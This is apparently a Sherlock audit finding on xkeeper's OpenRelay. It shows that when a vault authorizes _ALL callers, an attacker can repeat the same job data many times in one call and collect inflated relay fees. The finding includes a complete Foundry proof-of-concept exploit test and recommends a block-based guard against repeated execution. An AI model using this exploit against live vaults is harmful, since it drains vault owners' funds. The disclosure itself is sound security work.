Muscular Licorice Orangutan

medium

# Repeat the same job multiple times to earn fees with OpenRelay

## Summary

`OpenRelay` incentivizes bots to execute the vault jobs by paying the bots approximately 120% of the gas spent on the job.
In combination with the authorization to `_ALL` addresses in `VaultAutomation`, it introduces an incentive for a bot
to copy a valid job data, say, from another transaction, replicate it multiple times in the same transaction and get
paid proportional to the number of copies. If executing the job multiple times does not bring any value to the vault owner,
they simply overpay in fees.

## Vulnerability Detail

`OpenRelay` calculates the fee to the address `_feeRecipient` as follows:

```js
  function exec(
    IAutomationVault _automationVault,
    IAutomationVault.ExecData[] calldata _execData,
    address _feeRecipient
  ) external {
    if (_execData.length == 0) revert OpenRelay_NoExecData();
    // Execute the automation vault counting the gas spent
    uint256 _initialGas = gasleft();
    _automationVault.exec(msg.sender, _execData, new IAutomationVault.FeeData[](0));
    uint256 _gasSpent = _initialGas - gasleft();
    // Calculate the payment for the relayer
    uint256 _payment = (_gasSpent + GAS_BONUS) * block.basefee * GAS_MULTIPLIER / BASE;
```

`AutomationVault` permits a job execution from an arbitrary address that calls `OpenRelay.exec`, provided
that the vault owner authorized the address `_ALL` with `addRelay`:

```js
    if (!_approvedCallers[msg.sender].contains(_relayCaller) && !_approvedCallers[msg.sender].contains(_ALL)) {
      revert AutomationVault_NotApprovedRelayCaller();
    }
```

An attacker introduces an array with `n` copies of `_execData[0]` and calls `exec` with the large array as
`_execData` and designates itself as `_feeRecipient`. If the job does not fail on the second job copy, the attacker
collects `n` times the reward that the original bot expected to receive.

See below a complete integration test that uses `BasicJob.workHard` as an example:

<details>
    <summary>See a complete test</summary>

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import 'forge-std/console.sol';

import {CommonIntegrationTest} from '../integration/Common.t.sol';

import {IAutomationVault} from '../../interfaces/core/IAutomationVault.sol';
import {_ALL} from '../../utils/Constants.sol';

contract IntegrationOpenRelay is CommonIntegrationTest {
  function setUp() public override {
    // AutomationVault setup as OpenRelay.t.sol except the owner authorizes relaying to ALL
    CommonIntegrationTest.setUp();

    // Bot callers array: the owner authorizs the OpenRelay calls to all
    address[] memory _bots = new address[](1);
    _bots[0] = _ALL;

    // Job selectors array
    bytes4[] memory _jobSelectors = new bytes4[](2);
    _jobSelectors[0] = basicJob.work.selector;
    _jobSelectors[1] = basicJob.workHard.selector;

    // Job data array
    IAutomationVault.JobData[] memory _jobsData = new IAutomationVault.JobData[](1);
    _jobsData[0] = IAutomationVault.JobData(address(basicJob), _jobSelectors);

    startHoax(owner);

    // AutomationVault approve relay data
    automationVault.addRelay(address(openRelay), _bots, _jobsData);
    address(automationVault).call{value: 100 ether}('');
  }

  function test_rewards_once() public {
    doExec(1);
  }

  function test_rewards_repeated() public {
    doExec(100);
  }

  function doExec(uint256 times) public {
    uint16 _howHard = 10;

    address attacker = makeAddr('attacker');
    vm.deal(attacker, 1 ether);
    assertEq(attacker.balance, 1 ether);

    // repeat the same job multiple times
    IAutomationVault.ExecData[] memory _execData = new IAutomationVault.ExecData[](times);
    for (uint256 i = 0; i < times; i++) {
      _execData[i] =
        IAutomationVault.ExecData(address(basicJob), abi.encodeWithSelector(basicJob.workHard.selector, _howHard));
    }

    vm.startPrank(attacker);

    // Calculate the exec gas cost
    uint256 _gasBeforeExec = gasleft();
    openRelay.exec(automationVault, _execData, attacker);
    uint256 _gasAfterExec = gasleft();

    // Calculate tx cost
    uint256 _gasDiff = _gasBeforeExec - _gasAfterExec;
    uint256 _txCost = _gasDiff * block.basefee;

    // Calculate payment
    uint256 _payment = (_gasDiff + openRelay.GAS_BONUS()) * block.basefee * openRelay.GAS_MULTIPLIER() / openRelay.BASE();

    console.log('gas diff:', _gasDiff);
    console.log('txCost:', _txCost);
    console.log('calculated payment:', _payment);
    console.log('actual payment - gas:', attacker.balance - 1 ether);

    assertGt(attacker.balance - 1 ether, _payment - _txCost);
  }
}
```
</details>


## Impact

The owner significantly overpays for the job being executed multiple times, unless there is additional protection mechanism
in the job itself that prevents it from being executed more then once.

## Code Snippet

https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/relays/OpenRelay.sol#L28-L34
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/core/AutomationVault.sol#L399

## Tool used

Manual Review

## Recommendation

Save the block number in `AutomationVault` when a job was executed the last time. If the job is executed in the same block twice, or it is executed too early after the last execution, revert. If this is considered to be too expensive, explicitly specify in the documentation that a contract should implement a protection mechanism against a job being executed multiple times in the same transaction.